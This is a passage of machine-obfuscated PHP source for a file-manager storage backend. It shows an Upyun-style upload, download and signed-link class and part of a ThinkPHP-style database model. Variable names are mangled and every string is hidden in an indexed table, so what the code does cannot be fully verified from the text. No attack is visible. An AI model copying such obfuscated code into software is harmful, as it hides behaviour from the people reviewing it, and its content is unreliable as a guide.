fseek_64($ìŞñöö¸, $´¨Öñã†); $Ü¥Óòƒ = fread($ìŞñöö¸, $¨á±Ÿ”¯); $«…Òª½÷ = 0; do { $«…Òª½÷++; $ÃîïØÆ = $this->uploadPart($Üæšôú®, $ÃîïØÆ, $Ü¥Óòƒ); } while (!$ÃîïØÆ && $«…Òª½÷ < 3); if (!$ÃîïØÆ) { return !1; } $Ø¥„Ò¿ö = $ÃîïØÆ[$’‡œ€½[1572]]; $´¨Öñã† += $¨á±Ÿ”¯; } while ($Ø¥„Ò¿ö != -1); fclose($ìŞñöö¸); $ÄêçëÄ = array($’‡œ€½[1574], $’‡œ€½[1575] . $ÃîïØÆ[$’‡œ€½[1576]], $’‡œ€½[1570]); $«‡†ŒÙô = $this->ussRequest($Üæšôú®, $’‡œ€½[266], !1, $ÄêçëÄ); return $«‡†ŒÙô[$’‡œ€½[1286]] ? $this->getPathOuter($ „ï¹Š„) : !1; } private function uploadPart($†ƒ¿°ä, $Ü‰¿£Àò, &$‡ùÃƒ³) { $§ÉÏù‹Š =& $_SERVER[ü¢ÙÊñÛ]; $¡ô„»‚Å = array($§ÉÏù‹Š[1577], $§ÉÏù‹Š[1575] . $Ü‰¿£Àò[$§ÉÏù‹Š[1576]], $§ÉÏù‹Š[1578] . $Ü‰¿£Àò[$§ÉÏù‹Š[1572]], $§ÉÏù‹Š[157] . $Ü‰¿£Àò[$§ÉÏù‹Š[1573]]); $ÚÉõ’·õ = $this->ussRequest($†ƒ¿°ä, $§ÉÏù‹Š[266], $‡ùÃƒ³, $¡ô„»‚Å); return !$ÚÉõ’·õ[$§ÉÏù‹Š[1286]] ? $ÚÉõ’·õ[$§ÉÏù‹Š[1286]] : $ÚÉõ’·õ[$§ÉÏù‹Š[1276]]; } public function uploadFormData($ÂÎ¹Ö»¼, $İŸ©—™ = 3600) { return $this->uploadPolicy($ÂÎ¹Ö»¼, $İŸ©—™); } public function uploadMultiData($¡œÖÈÖÌ, $ËÓÏ€øÉ = 3600) { $şŠÔµ¡Ù =& $_SERVER[ü¢ÙÊñÛ]; $¹ËÏ˜ß = (int) $GLOBALS[$şŠÔµ¡Ù[17]][$şŠÔµ¡Ù[90]]; return $this->uploadPolicy($¡œÖÈÖÌ, $ËÓÏ€øÉ, $¹ËÏ˜ß); } private function uploadPolicy($ÌÓŸ’ğ, $î®ÒÈ‘ø = 3600, $ôğ©šÁû = 0) { $¦úÊ“ =& $_SERVER[ü¢ÙÊñÛ]; $¸ß‹ï = $¦úÊ“[18] . $this->bucket; $¼ĞŒ» = gmdate($¦úÊ“[1483]); $ö¨â®©Ò = array($¦úÊ“[1579] => $this->bucket, $¦úÊ“[1580] => $ÌÓŸ’ğ, $¦úÊ“[1581] => time() + $î®ÒÈ‘ø, $¦úÊ“[1582] => $¼ĞŒ»); if ($ôğ©šÁû) { $ö¨â®©Ò[$¦úÊ“[1468]] = $ôğ©šÁû; } $Ã‡³İÚ¥ = base64_encode(json_encode($ö¨â®©Ò)); $İ¿œì¶Ş = base64_encode(hash_hmac($¦úÊ“[1536], "\120\x4f\123\x54\46{$¸ß‹ï}\46{$¼ĞŒ»}\x26{$Ã‡³İÚ¥}", md5("{$this->userpass}"), !0)); $«í´³°ù = array($¦úÊ“[290] => $Ã‡³İÚ¥, $¦úÊ“[1583] => "\x55\120\x59\125\x4e\40{$this->username}\72{$İ¿œì¶Ş}", $¦úÊ“[219] => $this->endpoint . $¸ß‹ï); return $«í´³°ù; } public function download($Ø†ö†èô, $¾ëä˜Š) { $Ÿå‡ä°¾ = IO::getPathInner(IO::mkfile($¾ëä˜Š)); if (!($ˆŒ¢ßéš = $this->link($Ø†ö†èô))) { return !1; } $²ŞÎ‘û = 0; $ªÕ–ĞÓ = 1024 * 200; $Â’‰ÄôÛ = fopen($Ÿå‡ä°¾, $_SERVER[ü¢ÙÊñÛ][1531]); while (!0) { $‘Ğå•°¡ = $this->fileSubstr($Ø†ö†èô, $²ŞÎ‘û, $ªÕ–ĞÓ); if ($‘Ğå•°¡ === !1) { return !1; } fwrite($Â’‰ÄôÛ, $‘Ğå•°¡); $²ŞÎ‘û += $ªÕ–ĞÓ; if (strlen($‘Ğå•°¡) < $ªÕ–ĞÓ) { break; } } fclose($Â’‰ÄôÛ); return $¾ëä˜Š; } public function link($ˆùÒ¯˜ğ, $ÓÌé¯ŒÕ = array()) { $Ü™ì•¼˜ =& $_SERVER[ü¢ÙÊñÛ]; $ˆùÒ¯˜ğ = trim($ˆùÒ¯˜ğ, $Ü™ì•¼˜[18]); if (!empty($this->token)) { $‘ÜŠ“Å“ = strtotime(date($Ü™ì•¼˜[1584])); $šåö¦éú = substr(md5($this->token . $Ü™ì•¼˜[297] . $‘ÜŠ“Å“ . $Ü™ì•¼˜[1585] . $ˆùÒ¯˜ğ), 12, 8) . $‘ÜŠ“Å“; $ÓÌé¯ŒÕ[] = $Ü™ì•¼˜[1586] . $šåö¦éú; } $üÙƒÔ¹ó = !empty($ÓÌé¯ŒÕ) ? $Ü™ì•¼˜[87] . implode($Ü™ì•¼˜[297], $ÓÌé¯ŒÕ) : $Ü™ì•¼˜[22]; return $this->getHost() . $Ü™ì•¼˜[18] . $this->pathEncode($ˆùÒ¯˜ğ) . $üÙƒÔ¹ó; } public function fileOut($Ù®Á·Æ, $©ª¨”ºş = false, $ÉÂ‹¼“© = false, $…İÃÀïƒ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Ù®Á·Æ, $©ª¨”ºş, $ÉÂ‹¼“©, $…İÃÀïƒ); } if (!$ÉÂ‹¼“©) { $ÉÂ‹¼“© = $this->pathThis($Ù®Á·Æ); } $Â–§º¿ = $©ª¨”ºş ? array($_SERVER[ü¢ÙÊñÛ][1587] . rawurlencode($ÉÂ‹¼“©)) : array(); $¿™Ÿ±¨§ = $this->link($Ù®Á·Æ, $Â–§º¿); $this->fileOutLink($¿™Ÿ±¨§); } public function fileOutServer($Ä›øÎÌé, $²£Ø›ìÈ = false, $ö›šûÓ = false, $Ä­¹’Íè = '') { parent::fileOut($Ä›øÎÌé, $²£Ø›ìÈ, $ö›šûÓ, $Ä­¹’Íè); } public function fileOutImage($­ì»Šô‡, $ğ×¶ù…ˆ = 250) { $£”é•Ì¸ = $this->link($­ì»Šô‡ . $_SERVER[ü¢ÙÊñÛ][1588] . $ğ×¶ù…ˆ); $this->fileOutLink($£”é•Ì¸); } public function fileOutImageServer($Š¿¤¨¼, $¬§°Ãå = 250) { parent::fileOutImage($Š¿¤¨¼, $¬§°Ãå); } public function hashMd5($æî¦ éç) { $ÊÊŒõºÊ =& $_SERVER[ü¢ÙÊñÛ]; $¡ğ§éØ = $this->_objectMeta($æî¦ éç); return isset($¡ğ§éØ[$ÊÊŒõºÊ[258]]) ? $¡ğ§éØ[$ÊÊŒõºÊ[258]] : !1; } public function size($ãî×“½) { $¬Š°‘¶ = $this->objectMeta($ãî×“½); return $¬Š°‘¶ ? $¬Š°‘¶[$_SERVER[ü¢ÙÊñÛ][90]] : 0; } public function info($Ÿ‘ÉØšÅ) { if ($this->isFolder($Ÿ‘ÉØšÅ)) { return $this->folderInfo($Ÿ‘ÉØšÅ); } else { if ($this->isFile($Ÿ‘ÉØšÅ)) { return $this->fileInfo($Ÿ‘ÉØšÅ); } } return !1; } public function exist($š“‹ŠÅ„) { return $this->isFile($š“‹ŠÅ„) || $this->isFolder($š“‹ŠÅ„); } public function isFile($ÍäæÃøİ) { return !$this->isFolder($ÍäæÃøİ) && $this->objectMeta($ÍäæÃøİ); } public function isFolder($…”ĞÍ‘ù) { return $this->cacheMethod($_SERVER[ü¢ÙÊñÛ][190], $…”ĞÍ‘ù); } protected function objectMeta($ŞôÖ² á) { return $this->cacheMethod($_SERVER[ü¢ÙÊñÛ][192], $ŞôÖ² á); } protected function _objectMeta($ïôÏ–àá) { $ù¤–û§ =& $_SERVER[ü¢ÙÊñÛ]; if ($ïôÏ–àá == $ù¤–û§[22] || $ïôÏ–àá == $ù¤–û§[18]) { return array(); } $óÔÚ€Ü = $this->ussRequest($ïôÏ–àá, $ù¤–û§[1589]); if (!$óÔÚ€Ü[$ù¤–û§[1286]]) { return null; } $ŠÖ¿Ğı¬ = isset($óÔÚ€Ü[$ù¤–û§[1276]]) ? $óÔÚ€Ü[$ù¤–û§[1276]] : array(); if (!isset($ŠÖ¿Ğı¬[$ù¤–û§[1590]])) { return null; } $œÏÙ¢í¸ = array($ù¤–û§[43] => isset($ŠÖ¿Ğı¬[$ù¤–û§[1590]]) ? $ŠÖ¿Ğı¬[$ù¤–û§[1590]] : null, $ù¤–û§[90] => isset($ŠÖ¿Ğı¬[$ù¤–û§[1591]]) ? $ŠÖ¿Ğı¬[$ù¤–û§[1591]] : null, $ù¤–û§[258] => isset($ŠÖ¿Ğı¬[$ù¤–û§[1592]]) ? $ŠÖ¿Ğı¬[$ù¤–û§[1592]] : null, $ù¤–û§[1559] => isset($ŠÖ¿Ğı¬[$ù¤–û§[1593]]) ? $ŠÖ¿Ğı¬[$ù¤–û§[1593]] : null); $œÏÙ¢í¸[$ù¤–û§[1560]] = isset($ŠÖ¿Ğı¬[$ù¤–û§[1594]]) ? strtotime($ŠÖ¿Ğı¬[$ù¤–û§[1594]]) : $œÏÙ¢í¸[$ù¤–û§[1559]]; return $œÏÙ¢í¸; } protected function _isFolder($ºòíğ) { $Êıñüà· =& $_SERVER[ü¢ÙÊñÛ]; if ($ºòíğ == $Êıñüà·[22] || $ºòíğ == $Êıñüà·[18]) { return !0; } $·¾ø±Õ = $this->_objectMeta($ºòíğ); return isset($·¾ø±Õ[$Êıñüà·[43]]) && $·¾ø±Õ[$Êıñüà·[43]] == $Êıñüà·[89] ? !0 : !1; } } goto Dİ†µÙÎ¡; FÓíï…®’: define($_SERVER[ü¢ÙÊñÛ][331], 0); define($_SERVER[ü¢ÙÊñÛ][332], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\x6c\x65", "\157\162\144\x65\162", "\141\x6c\151\141\x73", "\150\x61\166\151\156\x67", "\x67\x72\157\x75\x70", "\154\x6f\143\153", "\x64\151\x73\x74\151\x6e\x63\x74", "\141\x75\164\x6f", "\146\151\x6c\164\x65\x72", "\166\141\x6c\x69\x64\141\x74\145", "\x72\x65\x73\165\x6c\x74", "\x62\x69\x6e\x64", "\x74\x6f\x6b\x65\156"); public function __construct($‡±„˜ñÔ = '', $¥ñ‡¹ƒ‰ = '', $úÌç²“ = '') { $×úäÃŞ =& $_SERVER[ü¢ÙÊñÛ]; $this->_initialize(); if (!empty($‡±„˜ñÔ)) { if (strpos($‡±„˜ñÔ, $×úäÃŞ[20])) { list($this->dbName, $this->name) = explode($×úäÃŞ[20], $‡±„˜ñÔ); } else { $this->name = $‡±„˜ñÔ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($¥ñ‡¹ƒ‰)) { $this->tablePrefix = $×úäÃŞ[22]; } elseif ($×úäÃŞ[22] != $¥ñ‡¹ƒ‰) { $this->tablePrefix = $¥ñ‡¹ƒ‰; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($×úäÃŞ[333]); } $this->db(0, empty($this->connection) ? $úÌç²“ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ç Ï§ˆ§ =& $_SERVER[ü¢ÙÊñÛ]; if (empty($this->fields)) { if (think_config($ç Ï§ˆ§[334])) { $¦¯ó¸ = $this->dbName ? $this->dbName : think_config($ç Ï§ˆ§[335]); $ªçÍâ“£ = think_var_cache($ç Ï§ˆ§[336] . strtolower(get_path_this($¦¯ó¸) . $ç Ï§ˆ§[20] . $this->name)); if ($ªçÍâ“£) { $³ø®ƒÌ£ = think_config($ç Ï§ˆ§[337]); if (empty($³ø®ƒÌ£) || $ªçÍâ“£[$ç Ï§ˆ§[338]] == $³ø®ƒÌ£) { $this->fields = $ªçÍâ“£; return; } } } $this->flush(); } } public function flush() { $¥¤î¨öÍ =& $_SERVER[ü¢ÙÊñÛ]; $this->db->setModel($this->name); $˜ÍæÒŞÉ = $this->db->getFields($this->getTableName()); if (!$˜ÍæÒŞÉ) { return !1; } $this->fields = array_keys($˜ÍæÒŞÉ); $this->fields[$¥¤î¨öÍ[339]] = !1; foreach ($˜ÍæÒŞÉ as $Ä‰ùÂ® => $¢—èÊÒé) { $Å‰¢ğ»[$Ä‰ùÂ®] = $¢—èÊÒé[$¥¤î¨öÍ[43]]; if ($¢—èÊÒé[$¥¤î¨öÍ[49]]) { $this->fields[$¥¤î¨öÍ[340]] = $Ä‰ùÂ®; if ($¢—èÊÒé[$¥¤î¨öÍ[52]]) { $this->fields[$¥¤î¨öÍ[339]] = !0; } } } $this->fields[$¥¤î¨öÍ[341]] = $Å‰¢ğ»; if (think_config($¥¤î¨öÍ[337])) { $this->fields[$¥¤î¨öÍ[338]] = think_config($¥¤î¨öÍ[337]); } if (think_config($¥¤î¨öÍ[334])) { $ÈÊ»Ô£³ = $this->dbName ? $this->dbName : think_config($¥¤î¨öÍ[335]); think_var_cache($¥¤î¨öÍ[336] . strtolower(get_path_this($ÈÊ»Ô£³) . $¥¤î¨öÍ[20] . $this->name), $this->fields); } } public function switchModel($²Î»½¨ä, $Óéüø„° = array()) { $Ô°²İ§Ÿ =& $_SERVER[ü¢ÙÊñÛ]; $ïèÀº‘ò = ucwords(strtolower($²Î»½¨ä)) . $Ô°²İ§Ÿ[342]; if (!class_exists($ïèÀº‘ò)) { think_exception($ïèÀº‘ò . think_lang($Ô°²İ§Ÿ[343])); } $this->_extModel = new $ïèÀº‘ò($this->name); if (!empty($Óéüø„°)) { foreach ($Óéüø„° as $²éŸ‘ø) { $this->_extModel->setProperty($²éŸ‘ø, $this->{$²éŸ‘ø}); } } return $this->_extModel; } public function __set($ßÉãÊ¡¥, $‹ïÊ«Éë) { $this->data[$ßÉãÊ¡¥] = $‹ïÊ«Éë; } public function __get($¸ÏÊş­) { return isset($this->data[$¸ÏÊş­]) ? $this->data[$¸ÏÊş­] : null; } public function __isset($òÎ©šñœ) { return isset($this->data[$òÎ©šñœ]); } public function __unset($«û÷¡‘¡) { unset($this->data[$«û÷¡‘¡]); } public function __call($ä×¿¶á, $®¹óÆÅ) { $—’Óùğç =& $_SERVER[ü¢ÙÊñÛ]; if (in_array(strtolower($ä×¿¶á), $this->methods, !0)) { $this->options[strtolower($ä×¿¶á)] = $®¹óÆÅ[0]; return $this; } elseif (in_array(strtolower($ä×¿¶á), array($—’Óùğç[344], $—’Óùğç[345], $—’Óùğç[346], $—’Óùğç[347], $—’Óùğç[348]), !0)) { $Í©ä˜–§ = isset($®¹óÆÅ[0]) ? $®¹óÆÅ[0] : $—’Óùğç[233]; $Í©ä˜–§ = $this->db->parseKey($Í©ä˜–§); return $this->getField(strtoupper($ä×¿¶á) . $—’Óùğç[349] . $Í©ä˜–§ . $—’Óùğç[350] . $ä×¿¶á, $—’Óùğç[344]); } elseif (strtolower(substr($ä×¿¶á, 0, 5)) == $—’Óùğç[351]) { $Í©ä˜–§ = think_parse_name(substr($ä×¿¶á, 5)); $‚Ì©è›–[$Í©ä˜–§] = $®¹óÆÅ[0]; return $this->where($‚Ì©è›–)->find(); } elseif (strtolower(substr($ä×¿¶á, 0, 10)) == $—’Óùğç[352]) { $»ü­ĞÉ” = think_parse_name(substr($ä×¿¶á, 10)); $‚Ì©è›–[$»ü­ĞÉ”] = $®¹óÆÅ[0]; return $this->where($‚Ì©è›–)->getField($®¹óÆÅ[1]); } elseif (isset($this->_scope[$ä×¿¶á])) { return $this->scope($ä×¿¶á, $®¹óÆÅ[0]); } elseif (method_exists($this, $ä×¿¶á)) { array_unshift($®¹óÆÅ, $ä×¿¶á); return call_user_func_array(array($this, $—’Óùğç[353]), $®¹óÆÅ); } else { return call_user_func_array(array(parent, $ä×¿¶á), $®¹óÆÅ); } } protected function call() { $³ÇÎÏÄ =& $_SERVER[ü¢ÙÊñÛ]; $œ“ˆà = func_get_args(); $åµ¿÷ÈÆ = array_shift($œ“ˆà); $Î’©‹ù  = $åµ¿÷ÈÆ; if (is_array($åµ¿÷ÈÆ)) { $Î’©‹ù  = $åµ¿÷ÈÆ[1]; $åµ¿÷ÈÆ = $åµ¿÷ÈÆ[0]; } $Ú–Ç•Ùñ = count($œ“ˆà) - 1; if (isset($œ“ˆà[$Ú–Ç•Ùñ]) && $œ“ˆà[$Ú–Ç•Ùñ] === $åµ¿÷ÈÆ) { think_exception(__CLASS__ . $³ÇÎÏÄ[14] . $åµ¿÷ÈÆ . think_lang($³ÇÎÏÄ[354])); return; } $œ“ˆà[] = $åµ¿÷ÈÆ; if (method_exists($this, $³ÇÎÏÄ[355])) { $è¥Í’Ùà = call_user_func_array(array($this, $³ÇÎÏÄ[356]), array($Î’©‹ù , $œ“ˆà)); if (!is_null($è¥Í’Ùà) && $è¥Í’Ùà !== !1) { return $è¥Í’Ùà; } } $Ôé¾–ã = call_user_func_array(array($this, $åµ¿÷ÈÆ), $œ“ˆà); if (method_exists($this, $³ÇÎÏÄ[357])) { $è¥Í’Ùà = call_user_func_array(array($this, $³ÇÎÏÄ[358]), array($Î’©‹ù , $œ“ˆà, $Ôé¾–ã)); if ($è¥Í’Ùà) { return $è¥Í’Ùà; } } return $Ôé¾–ã; } protected function _initialize() { } protected function _facade($ˆ­«â©Ö) { $ù­ŸÀÔ =& $_SERVER[ü¢ÙÊñÛ]; if (!empty($this->fields)) { foreach ($ˆ­«â©Ö as $ÃÑ¿»º¬ => $½üåÀƒ) { if (is_array($this->fields) && !in_array($ÃÑ¿»º¬, $this->fields, !0)) { unset($ˆ­«â©Ö[$ÃÑ¿»º¬]); } elseif (is_scalar($½üåÀƒ)) { $this->_parseType($ˆ­«â©Ö, $ÃÑ¿»º¬); } } } if (!empty($this->options[$ù­ŸÀÔ[359]])) { $ˆ­«â©Ö = array_map($this->options[$ù­ŸÀÔ[359]], $ˆ­«â©Ö); unset($this->options[$ù­ŸÀÔ[359]]); } $this->_beforeWrite($ˆ­«â©Ö); return $ˆ­«â©Ö; } protected function _beforeWrite(&$Æà¡şÂ) { } public function add($Î‡öğú§ = '', $…ÚÁù = array(), $§µØÒ’¬ = false) { if (empty($Î‡öğú§)) { if (!empty($this->data)) { $Î‡öğú§ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ü¢ÙÊñÛ][360]); return !1; } } $…ÚÁù = $this->_parseOptions($…ÚÁù); $Î‡öğú§ = $this->_facade($Î‡öğú§); if (!1 === $this->_beforeInsert($Î‡öğú§, $…ÚÁù)) { return !1; } $É…¥»³ = $this->db->insert($Î‡öğú§, $…ÚÁù, $§µØÒ’¬); if (!1 !== $É…¥»³) { $äîÓŸ‘ = $this->getLastInsID(); if ($äîÓŸ‘) { $Î‡öğú§[$this->getPk()] = $äîÓŸ‘; $this->_after_insert($Î‡öğú§, $…ÚÁù); return $äîÓŸ‘; } $this->_after_insert($Î‡öğú§, $…ÚÁù); } return $É…¥»³; } protected function _beforeInsert(&$³Õå‘ûé, $Å£é‘¬ú) { } protected function _after_insert($ßÆ–œ ³, $Şïô±Ë) { } public function addAll($èäºŸöÂ, $®í ®äæ = array(), $”ÒÎ˜ğ‹ = false) { $ª‡€¿š =& $_SERVER[ü¢ÙÊñÛ]; if (empty($èäºŸöÂ)) { $this->error = think_lang($ª‡€¿š[360]); return !1; } $®í ®äæ = $this->_parseOptions($®í ®äæ); foreach ($èäºŸöÂ as $ã­ùÅ¡ => $µıÛ‹Õ) { $èäºŸöÂ[$ã­ùÅ¡] = $this->_facade($µıÛ‹Õ); } if (method_exists($this->db, $ª‡€¿š[361])) { $÷åŞóÛÚ = $this->db->insertAll($èäºŸöÂ, $®í ®äæ, $”ÒÎ˜ğ‹); } else { $this->startTrans(); foreach ($èäºŸöÂ as $ã­ùÅ¡ => $µıÛ‹Õ) { $÷åŞóÛÚ = $this->db->insert($µıÛ‹Õ, $®í ®äæ, $”ÒÎ˜ğ‹); } $this->commit(); } if (!1 !== $÷åŞóÛÚ) { $¼ìÂİ = $this->getLastInsID(); if ($¼ìÂİ) { return $¼ìÂİ; } } return $÷åŞóÛÚ; } public function selectAdd($œù˜ç¿ñ = '', $…³¶øà = '', $Œ‡´Âé¸ = array()) { $úçİÓİ =& $_SERVER[ü¢ÙÊñÛ]; $Œ‡´Âé¸ = $this->_parseOptions($Œ‡´Âé¸); if (!1 === ($³£ùËû¶ = $this->db->selectInsert($œù˜ç¿ñ ? $œù˜ç¿ñ : $Œ‡´Âé¸[$úçİÓİ[362]], $…³¶øà ? $…³¶øà : $this->getTableName(), $Œ‡´Âé¸))) { $this->error = think_lang($úçİÓİ[363]); return !1; } else { return $³£ùËû¶; } } public function save($™˜È«ÒÕ = '', $ì§¥¿Ä¾ = array()) { $ô´÷Š´ =& $_SERVER[ü¢ÙÊñÛ]; if (empty($™˜È«ÒÕ)) { if (!empty($this->data)) { $™˜È«ÒÕ = $this->data; $this->data = array(); } else { $this->error = think_lang($ô´÷Š´[360]); return !1; } } $™˜È«ÒÕ = $this->_facade($™˜È«ÒÕ); $ì§¥¿Ä¾ = $this->_parseOptions($ì§¥¿Ä¾); $¡Ç©¦•‹ = $this->getPk(); if (!isset($ì§¥¿Ä¾[$ô´÷Š´[364]])) { if (isset($™˜È«ÒÕ[$¡Ç©¦•‹])) { $Ö£¾¤¦”[$¡Ç©¦•‹] = $™˜È«ÒÕ[$¡Ç©¦•‹]; $ì§¥¿Ä¾[$ô´÷Š´[364]] = $Ö£¾¤¦”; unset($™˜È«ÒÕ[$¡Ç©¦•‹]); } else { $this->error = think_lang($ô´÷Š´[363]); return !1; } } if (is_array($ì§¥¿Ä¾[$ô´÷Š´[364]]) && isset($ì§¥¿Ä¾[$ô´÷Š´[364]][$¡Ç©¦•‹])) { $Ù¿·Üâ— = $ì§¥¿Ä¾[$ô´÷Š´[364]][$¡Ç©¦•‹]; } if (!1 === $this->_beforeUpdate($™˜È«ÒÕ, $ì§¥¿Ä¾)) { return !1; } $›Í–±¿ = $this->db->update($™˜È«ÒÕ, $ì§¥¿Ä¾); if (!1 !== $›Í–±¿) { if (isset($Ù¿·Üâ—)) { $™˜È«ÒÕ[$¡Ç©¦•‹] = $Ù¿·Üâ—; } $this->_afterUpdate($™˜È«ÒÕ, $ì§¥¿Ä¾); } return $›Í–±¿; } protected function _beforeUpdate(&$å¼ÉİÃÁ, $±ºç§¹‘) { } protected function _afterUpdate($ı²µáŒ, $Œ•÷û) { } public function delete($ğòŠ‚ÇŠ = array()) { $•ä†‘¼° =& $_SERVER[ü¢ÙÊñÛ]; if (empty($ğòŠ‚ÇŠ) && empty($this->options[$•ä†‘¼°[364]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $™ä ô = $this->getPk(); if (is_numeric($ğòŠ‚ÇŠ) || is_string($ğòŠ‚ÇŠ)) { if (strpos($ğòŠ‚ÇŠ, $•ä†‘¼°[60])) { $Æ»ñ€âÛ[$™ä ô] = array($•ä†‘¼°[365], $ğòŠ‚ÇŠ); } else { $Æ»ñ€âÛ[$™ä ô] = $ğòŠ‚ÇŠ; } $this->options[$•ä†‘¼°[364]] = $Æ»ñ€âÛ; } $ğòŠ‚ÇŠ = $this->_parseOptions(); if (is_array($ğòŠ‚ÇŠ[$•ä†‘¼°[364]]) && isset($ğòŠ‚ÇŠ[$•ä†‘¼°[364]][$™ä ô])) { $ÖÒâ…Ğá = $ğòŠ‚ÇŠ[$•ä†‘¼°[364]][$™ä ô]; } $á˜ô€À = $this->db->delete($ğòŠ‚ÇŠ); if (!1 !== $á˜ô€À) { $ŞúØ„ÁÂ = array(); if (isset($ÖÒâ…Ğá)) { $ŞúØ„ÁÂ[$™ä ô] = $ÖÒâ…Ğá; } $this->_after_delete($ŞúØ„ÁÂ, $ğòŠ‚ÇŠ); } return $á˜ô€À; } protected function _after_delete($¾©´ï˜Æ, $¾ú§ãÈı) { } public function select($×Õ­Îé = array()) { $™åîà˜º =& $_SERVER[ü¢ÙÊñÛ]; if (is_string($×Õ­Îé) || is_numeric($×Õ­Îé)) { $Û£“©öÂ = $this->getPk(); if (strpos($×Õ­Îé, $™åîà˜º[60])) { $òªÜğÜŞ[$Û£“©öÂ] = array($™åîà˜º[365], $×Õ­Îé); } else { $òªÜğÜŞ[$Û£“©öÂ] = $×Õ­Îé; } $this->options[$™åîà˜º[364]] = $òªÜğÜŞ; } elseif (!1 === $×Õ­Îé) { $×Õ­Îé = $this->_parseOptions(); return $™åîà˜º[366] . $this->db->buildSelectSql($×Õ­Îé) . $™åîà˜º[367]; } $×Õ­Îé = $this->_parseOptions(); $Ì¸ÀèÙ = $this->db->select($×Õ­Îé); if (!1 === $Ì¸ÀèÙ) { return !1; } if (empty($Ì¸ÀèÙ)) { return null; } $this->_afterSelect($Ì¸ÀèÙ, $×Õ­Îé); return $Ì¸ÀèÙ; } protected function _afterSelect(&$¦­ğœÆİ, $ÎŸ†²ÎÖ) { } public function buildSql($¢üû×Û„ = array()) { $Ä»£»ÓÅ =& $_SERVER[ü¢ÙÊñÛ]; $¢üû×Û„ = $this->_parseOptions($¢üû×Û„); return $Ä»£»ÓÅ[366] . $this->db->buildSelectSql($¢üû×Û„) . $Ä»£»ÓÅ[367]; } public function optionsValue($Äå´ÜñÂ = null) { if (is_null($Äå´ÜñÂ)) { return $this->options; } elseif (is_array($Äå´ÜñÂ)) { $this->options = array_merge($this->options, $Äå´ÜñÂ); } } protected function _parseOptions($»øõš©ê = array()) { $„îç‹“â =& $_SERVER[ü¢ÙÊñÛ]; if (is_array($»øõš©ê)) { $»øõš©ê = array_merge($this->options, $»øõš©ê); } $this->options = array(); if (!isset($»øõš©ê[$„îç‹“â[368]])) { $»øõš©ê[$„îç‹“â[368]] = $this->getTableName(); $ƒĞ•ù˜š = $this->fields; } else { $ƒĞ•ù˜š = $this->getDbFields(); } if (!empty($»øõš©ê[$„îç‹“â[369]])) { $»øõš©ê[$„îç‹“â[368]] .= $„îç‹“â[63] . $»øõš©ê[$„îç‹“â[369]]; } $»øõš©ê[$„îç‹“â[370]] = $this->name; if (isset($»øõš©ê[$„îç‹“â[364]]) && is_array($»øõš©ê[$„îç‹“â[364]]) && !empty($ƒĞ•ù˜š) && !isset($»øõš©ê[$„îç‹“â[371]]) && !isset($»øõš©ê[$„îç‹“â[368]])) { foreach ($»øõš©ê[$„îç‹“â[364]] as $…ª¯¥õş => $Ú©ÉÔÖ¤) { $…ª¯¥õş = trim($…ª¯¥õş); if (in_array($…ª¯¥õş, $ƒĞ•ù˜š, !0)) { if (is_scalar($Ú©ÉÔÖ¤)) { $this->_parseType($»øõš©ê[$„îç‹“â[364]], $…ª¯¥õş); } } elseif (!is_numeric($…ª¯¥õş) && $„îç‹“â[21] != substr($…ª¯¥õş, 0, 1) && !1 === strpos($…ª¯¥õş, $„îç‹“â[20]) && !1 === strpos($…ª¯¥õş, $„îç‹“â[349]) && !1 === strpos($…ª¯¥õş, $„îç‹“â[225]) && !1 === strpos($…ª¯¥õş, $„îç‹“â[297])) { unset($»øõš©ê[$„îç‹“â[364]][$…ª¯¥õş]); } } } $this->_options_filter($»øõš©ê); return $»øõš©ê; } protected function _options_filter(&$ó†Æùóû) { } protected function _parseType(&$”û‡®¹», $¬‰ÏÃ£°) { $¹ŒšÏâ© =& $_SERVER[ü¢ÙÊñÛ]; if (empty($this->options[$¹ŒšÏâ©[372]][$¹ŒšÏâ©[14] . $¬‰ÏÃ£°])) { $ğ‡¸¾Ş = strtolower($this->fields[$¹ŒšÏâ©[341]][$¬‰ÏÃ£°]); if (!1 !== strpos($ğ‡¸¾Ş, $¹ŒšÏâ©[373])) { } elseif (!1 === strpos($ğ‡¸¾Ş, $¹ŒšÏâ©[374]) && !1 !== strpos($ğ‡¸¾Ş, $¹ŒšÏâ©[375])) { $”û‡®¹»[$¬‰ÏÃ£°] = intval($”û‡®¹»[$¬‰ÏÃ£°]); } elseif (!1 !== strpos($ğ‡¸¾Ş, $¹ŒšÏâ©[376]) || !1 !== strpos($ğ‡¸¾Ş, $¹ŒšÏâ©[377])) { $”û‡®¹»[$¬‰ÏÃ£°] = floatval($”û‡®¹»[$¬‰ÏÃ£°]); } elseif (!1 !== strpos($ğ‡¸¾Ş, $¹ŒšÏâ©[378])) { $”û‡®¹»[$¬‰ÏÃ£°] = (bool) $”û‡®¹»[$¬‰ÏÃ£°]; } } } public function find($×Æ¬µ€† = array()) { $ı°ÖËüë =& $_SERVER[ü¢ÙÊñÛ]; if (is_numeric($×Æ¬µ€†) || is_string($×Æ¬µ€†)) { $è•åœ·[$this->getPk()] = intval($×Æ¬µ€†); $this->options[$ı°ÖËüë[364]] = $è•åœ·; } $this->options[$ı°ÖËüë[379]] = 1; $×Æ¬µ€† = $this->_parseOptions(); $üõèêÖ = $this->db->select($×Æ¬µ€†); if (!1 === $üõèêÖ) { return !1; } if (empty($üõèêÖ)) { return null; } $this->data = $üõèêÖ[0]; $this->_afterFind($this->data, $×Æ¬µ€†); if (!empty($this->options[$ı°ÖËüë[380]])) { return $this->returnResult($this->data, $this->options[$ı°ÖËüë[380]]); } return $this->data; } protected function _afterFind(&$ÑŸëÖÁ, $ÆÊµ ³º) { } protected function returnResult($ÑÑ¥¦í, $…ŒŠˆØ• = '') { $ùµÑµ×š =& 